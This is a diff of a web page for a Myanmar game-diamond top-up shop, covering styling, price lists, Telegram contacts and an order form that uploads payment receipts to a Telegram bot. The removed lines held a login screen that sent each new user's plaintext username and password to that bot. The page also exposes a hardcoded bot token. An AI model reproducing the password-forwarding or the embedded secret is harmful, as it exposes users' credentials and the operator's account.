@@ -16,10 +16,13 @@
   --success: #00ff88;  
   --danger: #ff4d4d;
 }  
-  
+
+* { box-sizing: border-box; }
+
 body {  
-  margin:0; font-family: 'Segoe UI', Arial, sans-serif;  
+  margin:0; font-family: 'Segoe UI', Roboto, Arial, sans-serif;  
   background: var(--bg); color: var(--text);  
+  line-height: 1.4;
 }  
 
 .marquee-container {
@@ -32,42 +35,53 @@ body {
   border-bottom: 1px solid var(--danger);
 }
 
-#login-screen {  
-  position: fixed; inset: 0; background: var(--bg);  
-  display: flex; justify-content: center; align-items: center; z-index: 10000;  
-}  
-.login-box {  
-  background: var(--card); padding: 30px; border-radius: 20px;  
-  width: 85%; max-width: 350px; border: 1px solid var(--primary); text-align: center;  
-}  
-  
 header {  
   background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);  
   text-align: center; padding: 18px; font-size: 16px;  
-  color: var(--primary); font-weight: bold; position: sticky; top: 0; z-index: 10;  
+  color: var(--primary); font-weight: bold; position: sticky; top: 0; z-index: 10;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.5);
 }  
   
-.shop-status { text-align: center; font-size: 11px; color: var(--warning); background: rgba(255, 204, 0, 0.05); padding: 5px; }  
+.shop-status { text-align: center; font-size: 11px; color: var(--warning); background: rgba(255, 204, 0, 0.05); padding: 8px; }  
   
-.tabs { display: flex; justify-content: center; gap: 10px; padding: 15px 15px 5px 15px; }  
+.tabs { display: flex; justify-content: center; gap: 10px; padding: 15px; }  
 .tab-btn {  
   flex: 1; padding: 12px; background: var(--item); border: 1px solid #30363d;  
-  color: #8b949e; border-radius: 12px; font-weight: bold; cursor: pointer; text-align: center; font-size: 14px; transition: 0.3s;
+  color: #8b949e; border-radius: 12px; font-weight: bold; cursor: pointer; text-align: center; font-size: 13px; transition: 0.3s;
 }  
-.tab-btn.active { background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; }  
+.tab-btn.active { background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; border-color: transparent; }  
   
-section { padding: 15px; }  
+section { padding: 0 15px 15px 15px; }  
 .server-content { display: none; }  
 .server-content.active { display: block; }  
   
-.card { background: var(--card); border-radius: 20px; padding: 15px; margin-bottom: 20px; border: 1px solid #30363d; }  
-.note-box { background: rgba(255, 204, 0, 0.1); border: 1px solid var(--warning); color: var(--warning); padding: 10px; border-radius: 10px; font-size: 11px; margin-bottom: 15px; }  
-h2 { color: var(--primary); margin-top: 0; font-size: 1rem; margin-bottom: 15px; border-left: 4px solid var(--primary); padding-left: 10px; }  
+.card { background: var(--card); border-radius: 15px; padding: 15px; margin-bottom: 20px; border: 1px solid #30363d; }  
+.note-box { background: rgba(0, 242, 254, 0.1); border: 1px solid var(--primary); color: var(--primary); padding: 10px; border-radius: 10px; font-size: 11px; margin-bottom: 15px; }  
+h2 { color: var(--primary); margin-top: 0; font-size: 0.95rem; margin-bottom: 15px; border-left: 4px solid var(--primary); padding-left: 10px; }  
   
-.diamond-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }  
-.diamond-item { background: var(--item); border-radius: 12px; padding: 15px 5px; text-align: center; font-size: 11px; cursor: pointer; border: 1px solid transparent; transition: 0.2s; }  
-.diamond-item:active { transform: scale(0.95); background: #30363d; }
-.price { margin-top: 5px; font-weight: bold; color: var(--primary); font-size: 11px; }  
+.diamond-grid { 
+  display: grid; 
+  grid-template-columns: repeat(3, 1fr); 
+  gap: 10px; 
+}  
+
+.diamond-item { 
+  background: var(--item); border-radius: 12px; padding: 12px 5px; 
+  text-align: center; font-size: 10px; cursor: pointer; border: 1px solid #30363d; 
+  transition: 0.2s; display: flex; flex-direction: column; align-items: center; justify-content: space-between;
+  min-height: 115px;
+} 
+.diamond-item img { width: 40px; height: 40px; object-fit: contain; margin-bottom: 5px; }
+.diamond-item:active { transform: scale(0.95); background: #30363d; border-color: var(--primary); }
+.price { font-weight: bold; color: var(--primary); font-size: 10px; margin-top: 4px; }  
+
+.admin-box { display: flex; flex-direction: column; gap: 8px; }
+.admin-link {
+  background: rgba(255,255,255,0.05); padding: 12px; border-radius: 12px;
+  text-decoration: none; color: #fff; font-size: 13px; text-align: center;
+  border: 1px solid #30363d; transition: 0.3s;
+}
+.admin-link:hover { background: var(--primary); color: #000; }
   
 .toast {  
   position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);  
@@ -76,38 +90,32 @@ h2 { color: var(--primary); margin-top: 0; font-size: 1rem; margin-bottom: 15px;
 }  
   
 .popup {  
-  position: fixed; inset: 0; background: rgba(0, 0, 0, 0.9);  
-  display: none; justify-content: center; align-items: center; z-index: 999; backdrop-filter: blur(8px);  
+  position: fixed; inset: 0; background: rgba(0, 0, 0, 0.85);  
+  display: none; justify-content: center; align-items: center; z-index: 999; backdrop-filter: blur(8px); padding: 15px;
 }  
-.popup-box { background: #1c2128; width: 90%; max-width: 400px; border-radius: 20px; padding: 20px; border: 1px solid var(--primary); max-height: 90vh; overflow-y: auto; }  
-.close { text-align: right; font-size: 20px; color: #ff6b6b; cursor: pointer; }  
+.popup-box { 
+  background: #1c2128; width: 100%; max-width: 380px; border-radius: 20px; 
+  padding: 20px; border: 1px solid var(--primary); max-height: 90vh; overflow-y: auto; 
+}  
+.close { text-align: right; font-size: 24px; color: #ff6b6b; cursor: pointer; line-height: 1; }  
   
-input, textarea, select { width: 100%; padding: 12px; margin-top: 10px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: white; box-sizing: border-box; outline: none; }  
-input:focus { border-color: var(--primary); }
-.btn { margin-top: 15px; padding: 15px; background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; text-align: center; border-radius: 12px; font-weight: bold; cursor: pointer; }  
+input, textarea, select { width: 100%; padding: 12px; margin-top: 10px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: white; outline: none; font-size: 14px; }  
+.btn { margin-top: 15px; padding: 15px; background: linear-gradient(45deg, var(--secondary), var(--primary)); color: #000; text-align: center; border-radius: 12px; font-weight: bold; cursor: pointer; border: none; font-size: 15px;}  
 
-.btn:disabled { background: #555; cursor: not-allowed; opacity: 0.6; }
-
-#preview { width: 70px; height: 70px; object-fit: cover; margin-top: 10px; display: none; border-radius: 8px; border: 1px solid var(--primary); }  
-.pay-box { background: rgba(255, 255, 255, 0.05); padding: 12px; border-radius: 12px; margin-top: 10px; font-size: 12px; border: 1px dashed var(--primary); }  
+#preview { width: 100px; height: 100px; object-fit: cover; margin-top: 10px; display: none; border-radius: 8px; border: 1px solid var(--primary); }  
+.pay-box { background: rgba(255, 255, 255, 0.05); padding: 12px; border-radius: 12px; margin-top: 10px; font-size: 12px; border: 1px dashed var(--primary); line-height: 1.6; }  
   
-.history-item { background: var(--card); padding: 10px; border-radius: 10px; margin-top: 10px; border-left: 3px solid var(--primary); font-size: 12px; }  
-footer { text-align: center; padding: 20px; color: #666; font-size: 12px; }  
+.history-item { background: var(--card); padding: 12px; border-radius: 10px; margin-top: 10px; border-left: 3px solid var(--primary); font-size: 12px; }  
+footer { text-align: center; padding: 30px 20px; color: #666; font-size: 12px; }  
+
+@media (min-width: 600px) {
+  .diamond-grid { grid-template-columns: repeat(4, 1fr); }
+}
 </style>  
 </head>  
 <body>  
 
-<div id="login-screen">  
-  <div class="login-box">  
-    <h2>🔐 PMK Login</h2>  
-    <p id="login-msg" style="font-size:12px; color:#8b949e;">အကောင့်မရှိရင် အသစ်ဖွင့်ပါ</p>  
-    <input type="text" id="username" placeholder="နာမည်ရိုက်ပါ">  
-    <input type="password" id="password" placeholder="Password သတ်မှတ်ပါ">  
-    <div class="btn" onclick="handleAuth()">Login / Sign Up</div>  
-  </div>  
-</div>  
-
-<div id="main-content" style="display:none;">  
+<div id="main-content">  
   <header>🎮 PMK GAME SHORT MYANMAR 💎</header>  
   
   <div class="marquee-container">
@@ -126,47 +134,46 @@ footer { text-align: center; padding: 20px; color: #666; font-size: 12px; }
       <div class="card">  
         <h2>🎟 Passes (ရိုးရိုး)</h2>  
         <div class="diamond-grid">  
-          <div class="diamond-item" onclick="openPopup('Weekly Pass - 6000 Ks')">💎 Weekly<div class="price">6000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Value Pack - 1500 Ks')">💎 Value Pack<div class="price">1500 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Twilight Pass - 32000 Ks')">🌙 Twilight<div class="price">32000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('Weekly Pass - 6200 Ks')"><img src="https://i.ibb.co/TBtp7bt8/IMG-20251215-144936-249.png">Weekly Pass<div class="price">6200 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('Super Diamond Pass - 4000 Ks')"><img src="https://i.ibb.co/hRKq3C9d/IMG-20251215-145339-565.png">Super Pass<div class="price">4000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('Twilight Pass - 34000 Ks')"><img src="https://i.ibb.co/ymCS87tn/IMG-20251215-145341-949.png">Twilight Pass <div class="price">34000 Ks</div></div>  
         </div>  
       </div>  
 
       <div class="card">  
         <h2>🎁 2X Diamonds (ရိုးရိုး)</h2>  
-        <div class="note-box">⚠️ ပထမတစ်ခါထည့်ရင် စိန်နှစ်စရပါမယ်။ထည့်ထားပြီးရင်ထက်ထည့်လို့မရပါ။စိန်တစ်ခုကိုတစ်ခါထည့်လို့ရပါမယ်။</div>  
+        <div class="note-box">⚠️ ပထမတစ်ခါထည့်ရင် စိန်နှစ်စရပါမယ်။</div>  
         <div class="diamond-grid">  
-          <div class="diamond-item" onclick="openPopup('50+50 Dia - 3500 Ks')">💎 50+50<div class="price">3500 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('150+150 Dia - 9800 Ks')">💎 150+150<div class="price">9800 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('250+250 Dia - 15500 Ks')">💎 250+250<div class="price">15500 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('500+500 Dia - 31500 Ks')">💎 500+500<div class="price">31500 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('50+50 Dia - 3500 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">50+50<div class="price">3500 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('150+150 Dia - 11000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">150+150<div class="price">11000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('250+250 Dia - 17000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">250+250<div class="price">17000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('500+500 Dia - 35000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">500+500<div class="price">35000 Ks</div></div>  
         </div>  
       </div>  
 
       <div class="card">  
         <h2>💎 MLBB Normal (Direct)</h2>  
         <div class="diamond-grid">  
-          <div class="diamond-item" onclick="openPopup('5 Dis - 500 Ks')">💎 5<div class="price">500 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('11 Dia - 900 Ks')">💎 11<div class="price">900 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('22 Dia - 1900 Ks')">💎 22<div class="price">1900 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('33 Dia - 2900 Ks')">💎 33<div class="price">2900 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('44 Dia - 3800 Ks')">💎 44<div class="price">3800 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('56 Dia - 4500 Ks')">💎 56<div class="price">4500 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('86 Dia - 5500 Ks')">💎 86<div class="price">5500 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('172 Dia - 9800 Ks')">💎 172<div class="price">9800 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('257 Dia - 15000 Ks')">💎 257<div class="price">15000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('343 Dia - 20000 Ks')">💎 343<div class="price">20000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('429 Dia - 24000 Ks')">💎 429<div class="price">24000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('515 Dia - 30000 Ks')">💎 515<div class="price">30000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('600 Dia - 35000 Ks')">💎 600<div class="price">35000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('706 Dia - 40000 Ks')">💎 706<div class="price">40000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('963 Dia - 52000 Ks')">💎 963<div class="price">52000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('1049 Dia - 60000 Ks')">💎 1049<div class="price">60000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('1135 Dia - 62000 Ks')">💎 1135<div class="price">62000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('2195 Dia - 114000 Ks')">💎 2195<div class="price">114000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('3688 Dia - 200000 Ks')">💎 3688<div class="price">200000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('5532 Dia - 300000 Ks')">💎 5532<div class="price">300000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('9288 Dia - 482000 Ks')">💎 9288<div class="price">482000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('11 Dia - 1000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">11 Dia<div class="price">1000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('22 Dia - 1900 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">22 Dia<div class="price">1900 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('33 Dia - 2900 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">33 Dia<div class="price">2900 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('44 Dia - 3800 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">44 Dia<div class="price">3800 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('56 Dia - 4500 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">56 Dia<div class="price">4500 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('86 Dia - 5500 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">86 Dia<div class="price">5500 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('172 Dia - 10000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">172 Dia<div class="price">10000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('257 Dia - 15000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">257 Dia<div class="price">15000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('343 Dia - 20000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">343 Dia<div class="price">20000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('429 Dia - 24500 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">429 Dia<div class="price">24500 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('515 Dia - 32000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">515 Dia<div class="price">32000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('600 Dia - 35000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">600 Dia<div class="price">35000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('706 Dia - 40000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">706 Dia<div class="price">40000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('963 Dia - 53000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">963 Dia<div class="price">53000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('1049 Dia - 61000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">1049 Dia<div class="price">61000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('1135 Dia - 64000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">1135 Dia<div class="price">64000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('2195 Dia - 117000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">2195 Dia<div class="price">117000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('3688 Dia - 200000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">3688 Dia<div class="price">200000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('5532 Dia - 300000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">5532 Dia<div class="price">300000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('9288 Dia - 495000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">9288 Dia<div class="price">495000 Ks</div></div>  
         </div>  
       </div>  
     </div>  
@@ -175,98 +182,85 @@ footer { text-align: center; padding: 20px; color: #666; font-size: 12px; }
       <div class="card">  
         <h2>🇲🇾 MLBB Malaysia Server</h2>  
         <div class="diamond-grid">  
-          <div class="diamond-item" onclick="openPopup('Weekly Pass (MY) - 9000 Ks')">🎟 Weekly<div class="price">9000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Dia 14 (MY) - 1200 Ks')">💎 14<div class="price">1200 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Dia 74 (MY) - 5000 Ks')">💎 74<div class="price">5000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Dia 140 (MY) - 9500 Ks')">💎 140<div class="price">9500 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Dia 284 (MY) - 19000 Ks')">💎 284<div class="price">19000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Dia 429 (MY) - 28000 Ks')">💎 429<div class="price">28000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Dia 2976 (MY) - 190000 Ks')">💎 2976<div class="price">190000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('Weekly Pass (MY) - 9000 Ks')"><img src="https://i.ibb.co/TBtp7bt8/IMG-20251215-144936-249.png">Weekly<div class="price">9000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('Dia 14 (MY) - 1200 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">14 Dia<div class="price">1200 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('74 Dia (MY) - 5000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">74 Dia<div class="price">5000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('140 Dia (MY) - 9500 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">140 Dia<div class="price">9500 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('284 Dia (MY) - 19000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">284 Dia<div class="price">19000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('429 Dia (MY) - 28000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">429 Dia<div class="price">28000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('2976 Dia (MY) - 190000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">2976 Dia<div class="price">190000 Ks</div></div>  
         </div>  
       </div>  
+
       <div class="card">  
         <h2>🎁 2X Diamonds (Malaysia)</h2>  
         <div class="diamond-grid">  
-          <div class="diamond-item" onclick="openPopup('Dia 50+50 (MY) - 4000 Ks')">💎 50+50<div class="price">4000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Dia 150+150 (MY) - 13000 Ks')">💎 150+150<div class="price">13000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Dia 250+250 (MY) - 20000 Ks')">💎 250+250<div class="price">20000 Ks</div></div>  
-          <div class="diamond-item" onclick="openPopup('Dia 500+500 (MY) - 40000 Ks')">💎 500+500<div class="price">40000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('50+50 Dia (MY) - 4000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">50+50<div class="price">4000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('150+150 Dia (MY) - 13000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">150+150<div class="price">13000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('250+250 Dia (MY) - 20000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">250+250<div class="price">20000 Ks</div></div>  
+          <div class="diamond-item" onclick="openPopup('500+500 Dia (MY) - 40000 Ks')"><img src="https://i.ibb.co/YF9MKqwQ/IMG-20251215-145344-325.png">500+500<div class="price">40000 Ks</div></div>  
         </div>  
       </div>  
     </div>  
 
-    <h2 style="text-align:center; font-size:14px;">📜 ဝယ်ယူခဲ့မှုမှတ်တမ်း</h2>  
-    <div id="history-list"></div>
+    <div class="card">
+      <h2>📞 ဆက်သွယ်ရန်</h2>
+      <div class="admin-box">
+          <a href="https://t.me/Mgflash_2038" target="_blank" class="admin-link">👤 Owner: @Mgflash_2038</a>
+          <a href="https://t.me/Skystudiooffical1" target="_blank" class="admin-link">🛡 Admin: @Skystudiooffical1</a>
+      </div>
+    </div>
 
+    <h2 style="text-align:center; font-size:14px; margin-top: 20px;">📜 ဝယ်ယူခဲ့မှုမှတ်တမ်း</h2>  
+    <div id="history-list"></div>
   </section>  
   <footer>© 2026 PMK Diamond Shop</footer>  
 </div>  
 
-<div id="toast" class="toast">✅ Order တင်ခြင်း အောင်မြင်ပါသည်။</div>  
-
 <div class="popup" id="popup">  
   <div class="popup-box">  
     <div class="close" onclick="closePopup()">✕</div>  
-    <h2 id="diaTitle" style="text-align:center; border:none;"></h2>  
+    <h2 id="diaTitle" style="text-align:center; border:none; color: var(--primary);"></h2>  
+    
+    <input id="userName" type="text" placeholder="Telegram Name">
     <div style="display:flex; gap:10px;">  
       <input id="gid" type="number" placeholder="Game ID">  
       <input id="sid" type="number" placeholder="Server ID">  
     </div>  
+    
     <select id="method">  
       <option value="">Payment Method ရွေးပါ</option>  
-      <option>KBZ Pay</option>  
-      <option>Wave Pay</option>  
+      <option value="KBZ Pay">KBZ Pay</option>  
+      <option value="Wave Pay">Wave Pay</option>  
     </select>  
+    
     <div class="pay-box">  
       📱 <b>Wave:</b> 09789457150 (Nyein Ei Phyo)<br>  
       📱 <b>Kpay:</b> 09985496310 (U Win Zaw Tun)  
     </div>  
+    
+    <p style="font-size: 11px; margin: 10px 0 0 5px; color: #8b949e;">ငွေလွှဲပြေစာ ပုံတင်ပါ -</p>
     <input type="file" id="img" accept="image/*">  
     <center><img id="preview"></center>  
-    <textarea id="pay" placeholder="ပိုက်ဆံဘယ်လောက်လွှဲထားလဲ?"></textarea>  
-    <button class="btn" id="submit-btn" onclick="sendOrder()" style="width:100%; border:none;">📩 Confirm Order</button>  
+    
+    <textarea id="pay" placeholder="မှတ်ချက် (ရှိလျှင်)"></textarea>  
+    <button class="btn" id="submit-btn" onclick="sendOrder()" style="width:100%;">📩 Confirm Order</button>  
   </div>  
 </div>  
 
+<div id="toast" class="toast">✅ Order တင်ခြင်း အောင်မြင်ပါသည်။</div>  
 <audio id="successSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3"></audio>
 
 <script>  
 const BOT_TOKEN = "8103883017:AAFVj-m7UtA20HpjfSZf_Euy0fSW8rHU-U8";  
 const CHAT_ID = "7090654595";  
-
-// 🛑 BAN LIST: ဒီနေရာမှာ ဘန်းချင်တဲ့ နာမည်တွေကို ထည့်ပါ
-const BANNED_USERS = ["NyiNyi", "spammer", "fake_pay"];
   
-function handleAuth() {  
-  const user = document.getElementById('username').value.trim();  
-  const pass = document.getElementById('password').value.trim();  
-  
-  if(!user || !pass) return alert("နာမည်နှင့် Password ဖြည့်ပါ");  
-
-  // Check if banned
-  if(BANNED_USERS.includes(user)) {
-      alert("❌ သင့်အကောင့်သည် စည်းကမ်းဖောက်ဖျက်မှုကြောင့် အပိတ်ခံထားရပါသည်။");
-      return;
+window.onload = () => { 
+  loadHistory();
+  if(localStorage.getItem('pmk_user_name')) {
+    document.getElementById('userName').value = localStorage.getItem('pmk_user_name');
   }
-
-  const savedUser = localStorage.getItem('pmk_user');  
-  const savedPass = localStorage.getItem('pmk_pass');  
-  if(!savedUser) {  
-    localStorage.setItem('pmk_user', user); localStorage.setItem('pmk_pass', pass);  
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🆕 New User: "+user+"\n🔑 Pass: "+pass)}`);  
-    enterShop();  
-  } else {  
-    if(user === savedUser && pass === savedPass) enterShop(); else alert("Password မှားနေပါသည်");  
-  }  
-}  
-  
-function enterShop() {  
-  document.getElementById('login-screen').style.display = 'none';  
-  document.getElementById('main-content').style.display = 'block';  
-  loadHistory();  
-}  
-  
-window.onload = () => { if(localStorage.getItem('pmk_user')) document.getElementById('login-msg').innerText = "ပြန်လည်ကြိုဆိုပါတယ် (Password ရိုက်ပါ)"; };  
+};  
   
 let selectedDiamond = "";  
 let currentServer = "Normal Server";  
@@ -283,15 +277,19 @@ function openPopup(d){
   selectedDiamond = d; 
   document.getElementById('diaTitle').innerText = d; 
   document.getElementById('popup').style.display = "flex"; 
-  const btn = document.getElementById('submit-btn');
-  btn.disabled = false;
-  btn.innerText = "📩 Confirm Order";
+  document.body.style.overflow = "hidden";
 }  
-function closePopup(){ document.getElementById('popup').style.display = "none"; }  
+
+function closePopup(){ 
+  document.getElementById('popup').style.display = "none"; 
+  document.body.style.overflow = "auto";
+}  
   
 document.getElementById('img').onchange = (e) => {  
   const p = document.getElementById('preview');  
-  p.src = URL.createObjectURL(e.target.files[0]); p.style.display = "block";  
+  if(e.target.files[0]) {
+    p.src = URL.createObjectURL(e.target.files[0]); p.style.display = "block";  
+  }
 };  
 
 function playSuccessSound() {
@@ -300,6 +298,7 @@ function playSuccessSound() {
 }
   
 async function sendOrder(){  
+  const buyerName = document.getElementById('userName').value.trim();
   const gid = document.getElementById('gid').value;  
   const sid = document.getElementById('sid').value;  
   const method = document.getElementById('method').value;  
@@ -307,15 +306,16 @@ async function sendOrder(){
   const imgFile = document.getElementById('img').files[0];  
   const btn = document.getElementById('submit-btn');
 
-  if(!gid || !sid || !method || !imgFile) return alert("အချက်အလက်စုံအောင်ဖြည့်ပါ");  
-  
+  if(!buyerName || !gid || !sid || !method || !imgFile) return alert("အချက်အလက်စုံအောင်ဖြည့်ပါ");  
+
+  localStorage.setItem('pmk_user_name', buyerName);
   btn.disabled = true;
   btn.innerText = "⏳ Processing...";
 
   const time = new Date().toLocaleString();
   const formData = new FormData();  
   formData.append("chat_id", CHAT_ID);  
-  formData.append("caption", `🔔 **NEW ORDER** 🔔\n\n👤 User: ${localStorage.getItem('pmk_user')}\n🌐 Server: ${currentServer}\n💎 Item: ${selectedDiamond}\n🎮 ID: ${gid} (${sid})\n💳 Method: ${method}\n💰 Amount: ${payAmt}\n⏰ Time: ${time}`);  
+  formData.append("caption", `🔔 **NEW ORDER** 🔔\n\n👤 Buyer: ${buyerName}\n🌐 Server: ${currentServer}\n💎 Item: ${selectedDiamond}\n🎮 ID: ${gid} (${sid})\n💳 Method: ${method}\n💰 Info: ${payAmt}\n⏰ Time: ${time}`);  
   formData.append("photo", imgFile);  
   
   try {
@@ -327,17 +327,14 @@ async function sendOrder(){
       const t = document.getElementById('toast'); 
       t.style.display = "block"; 
       setTimeout(()=> t.style.display="none", 3000);  
-      // Reset fields
-      document.getElementById('pay').value = "";
       document.getElementById('img').value = "";
       document.getElementById('preview').style.display = "none";
     } else {
-      alert("Error ဖြစ်သွားပါသည်။ ပြန်ကြိုးစားကြည့်ပါ။");
-      btn.disabled = false;
-      btn.innerText = "📩 Confirm Order";
+      alert("Error! ပြန်ကြိုးစားပါ။");
     }
   } catch (e) {
     alert("Connection Error!");
+  } finally {
     btn.disabled = false;
     btn.innerText = "📩 Confirm Order";
   }
@@ -345,15 +342,15 @@ async function sendOrder(){
   
 function saveOrder(item, gid, sid) {  
   let h = JSON.parse(localStorage.getItem('orders')) || [];  
-  h.push({ item, gid, sid, date: new Date().toLocaleString() });  
-  localStorage.setItem('orders', JSON.stringify(h)); loadHistory();  
+  h.unshift({ item, gid, sid, date: new Date().toLocaleString() });  
+  localStorage.setItem('orders', JSON.stringify(h.slice(0,10))); loadHistory();  
 }  
   
 function loadHistory() {  
   const list = document.getElementById('history-list');  
   let h = JSON.parse(localStorage.getItem('orders')) || [];  
-  if(h.length === 0) { list.innerHTML = "<p style='text-align:center; font-size:11px;'>မှတ်တမ်းမရှိပါ။</p>"; return; }  
-  list.innerHTML = h.reverse().slice(0,5).map(o => `<div class="history-item"><b>${o.item}</b><br>ID: ${o.gid}(${o.sid})<br><small>${o.date}</small></div>`).join('');  
+  if(h.length === 0) { list.innerHTML = "<p style='text-align:center; font-size:11px; color:#555;'>မှတ်တမ်းမရှိပါ။</p>"; return; }  
